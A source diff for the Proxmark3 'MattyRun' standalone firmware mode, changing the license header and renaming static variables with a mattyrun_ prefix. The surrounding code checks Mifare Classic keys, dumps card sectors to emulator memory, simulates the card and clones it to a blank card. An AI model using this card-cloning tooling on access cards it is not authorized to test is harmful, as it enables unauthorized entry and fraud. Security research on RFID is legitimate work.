@@ -1,10 +1,18 @@
 //-----------------------------------------------------------------------------
-// Matías A. Ré Medina 2016
-// Christian Herrmann, 2018
+// Copyright (C) Matías A. Ré Medina 2016
+// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
 //
-// This code is licensed to you under the terms of the GNU GPL, version 2 or,
-// at your option, any later version. See the LICENSE.txt file for the text of
-// the license.
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// See LICENSE.txt for the text of the license.
 //-----------------------------------------------------------------------------
 // main code for HF aka MattyRun by Matías A. Ré Medina
 //-----------------------------------------------------------------------------
@@ -12,7 +20,7 @@
 ### What I did:
 I've personally recoded the image of the ARM in order to automate
 the attack and simulation on Mifare cards. I've moved some of the
-implementation on the client side to the ARM such as *chk*, *ecfill*, *sim*
+implementation on the client side to the ARM such as *chk*, *mattyrun_ecfill*, *sim*
 and *clone* commands.
 
 ### What it does now:
@@ -49,16 +57,16 @@ on a blank card.
 #include "mifaresim.h"  // mifare1ksim
 #include "mifareutil.h"
 
-static uint8_t uid[10];
-static uint32_t cuid;
-static iso14a_card_select_t p_card;
+static uint8_t mattyrun_uid[10];
+static uint32_t mattyrun_cuid;
+static iso14a_card_select_t mattyrun_p_card;
 
 // Pseudo-configuration block.
-static bool printKeys = false;         // Prints keys
+static bool mattyrun_printKeys = false;         // Prints keys
 //static bool transferToEml = true;      // Transfer keys to emulator memory
-static bool ecfill = true;             // Fill emulator memory with cards content.
+static bool mattyrun_ecfill = true;             // Fill emulator memory with cards content.
 //static bool simulation = true;         // Simulates an exact copy of the target tag
-static bool fillFromEmulator = false;  // Dump emulator memory.
+static bool mattyrun_fillFromEmulator = false;  // Dump emulator memory.
 
 //-----------------------------------------------------------------------------
 // Matt's StandAlone mod.
@@ -96,12 +104,12 @@ static int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_
     while (true) {
         // get UID from chip
         if (workFlags & 0x01) {
-            if (!iso14443a_select_card(uid, &p_card, &cuid, true, 0, true)) {
+            if (!iso14443a_select_card(mattyrun_uid, &mattyrun_p_card, &mattyrun_cuid, true, 0, true)) {
                 DbprintfEx(FLAG_NEWLINE, "Can't select card");
                 break;
             };
 
-            if (mifare_classic_halt(NULL, cuid)) {
+            if (mifare_classic_halt(NULL, mattyrun_cuid)) {
                 DbprintfEx(FLAG_NEWLINE, "Halt error");
                 break;
             };
@@ -121,7 +129,7 @@ static int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_
                 break;
             };
 
-            if (mifare_classic_halt(NULL, cuid)) {
+            if (mifare_classic_halt(NULL, mattyrun_cuid)) {
                 DbprintfEx(FLAG_NEWLINE, "Halt error");
                 break;
             };
@@ -157,7 +165,7 @@ static int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_
         };
 
         if (workFlags & 0x04) {
-            if (mifare_classic_halt(NULL, cuid)) {
+            if (mifare_classic_halt(NULL, mattyrun_cuid)) {
                 DbprintfEx(FLAG_NEWLINE, "Halt error");
                 break;
             };
@@ -192,13 +200,13 @@ static int saMifareChkKeys(uint8_t blockNo, uint8_t keyType, bool clearTrace,
 
         /* no need for anticollision. just verify tag is still here */
         // if (!iso14443a_fast_select_card(cjuid, 0)) {
-        if (!iso14443a_select_card(uid, &p_card, &cuid, true, 0, true)) {
+        if (!iso14443a_select_card(mattyrun_uid, &mattyrun_p_card, &mattyrun_cuid, true, 0, true)) {
             DbprintfEx(FLAG_NEWLINE, "FATAL : E_MF_LOSTTAG");
             break;
         }
 
         uint64_t ui64Key = bytes_to_num(datain + i * 6, 6);
-        if (mifare_classic_auth(pcs, cuid, blockNo, keyType, ui64Key, AUTH_FIRST)) {
+        if (mifare_classic_auth(pcs, mattyrun_cuid, blockNo, keyType, ui64Key, AUTH_FIRST)) {
             uint8_t dummy_answer = 0;
             ReaderTransmit(&dummy_answer, 1, NULL);
             // wait for the card to become ready again
@@ -237,7 +245,7 @@ static int saMifareECardLoad(uint32_t numofsectors, uint8_t keytype) {
 
     int retval = PM3_SUCCESS;
 
-    if (!iso14443a_select_card(uid, &p_card, &cuid, true, 0, true)) {
+    if (!iso14443a_select_card(mattyrun_uid, &mattyrun_p_card, &mattyrun_cuid, true, 0, true)) {
         retval = PM3_ESOFT;
         DbprintfEx(FLAG_RAWPRINT, "Can't select card");
         goto out;
@@ -246,12 +254,12 @@ static int saMifareECardLoad(uint32_t numofsectors, uint8_t keytype) {
     for (uint8_t s = 0; s < numSectors; s++) {
         uint64_t ui64Key = emlGetKey(s, keyType);
         if (s == 0) {
-            if (mifare_classic_auth(pcs, cuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_FIRST)) {
+            if (mifare_classic_auth(pcs, mattyrun_cuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_FIRST)) {
                 retval = PM3_ESOFT;
                 break;
             }
         } else {
-            if (mifare_classic_auth(pcs, cuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_NESTED)) {
+            if (mifare_classic_auth(pcs, mattyrun_cuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_NESTED)) {
                 retval = PM3_ESOFT;
                 break;
             }
@@ -259,7 +267,7 @@ static int saMifareECardLoad(uint32_t numofsectors, uint8_t keytype) {
 
         // failure to read one block,  skips to next sector.
         for (uint8_t blockNo = 0; blockNo < NumBlocksPerSector(s); blockNo++) {
-            if (mifare_classic_readblock(pcs, cuid, FirstBlockOfSector(s) + blockNo, dataoutbuf)) {
+            if (mifare_classic_readblock(pcs, mattyrun_cuid, FirstBlockOfSector(s) + blockNo, dataoutbuf)) {
                 retval = PM3_ESOFT;
                 break;
             };
@@ -275,7 +283,7 @@ static int saMifareECardLoad(uint32_t numofsectors, uint8_t keytype) {
         }
     }
 
-    int res = mifare_classic_halt(pcs, cuid);
+    int res = mifare_classic_halt(pcs, mattyrun_cuid);
     (void)res;
 
 out:
@@ -400,7 +408,7 @@ void RunMod(void) {
     }
 
     // Pretty print of the keys to be checked.
-    if (printKeys) {
+    if (mattyrun_printKeys) {
         Dbprintf("[+] Printing mf keys");
         for (uint8_t keycnt = 0; keycnt < mfKeysCnt; keycnt++)
             Dbprintf("[-] chk mf key[%2d] %02x%02x%02x%02x%02x%02x", keycnt,
@@ -503,7 +511,7 @@ void RunMod(void) {
 
         Dbprintf("\t [✓] Found keys have been transferred to the emulator memory.");
 
-        if (ecfill) {
+        if (mattyrun_ecfill) {
             int filled;
             Dbprintf("\tFilling in with key A.");
 
@@ -530,12 +538,12 @@ void RunMod(void) {
                 uint16_t simflags = FLAG_UID_IN_EMUL | FLAG_MF_1K;
 
                 SpinOff(1000);
-                Mifare1ksim(simflags, 0, uid, 0, 0);
+                Mifare1ksim(simflags, 0, mattyrun_uid, 0, 0);
                 LED_B_OFF();
                 Dbprintf("\t [✓] Simulation ended");
 
                 // Needs further testing.
-                if (fillFromEmulator) {
+                if (mattyrun_fillFromEmulator) {
                     uint8_t retry = 5;
                     Dbprintf("\t Trying to dump into blank card.");
                     int flags = 0;
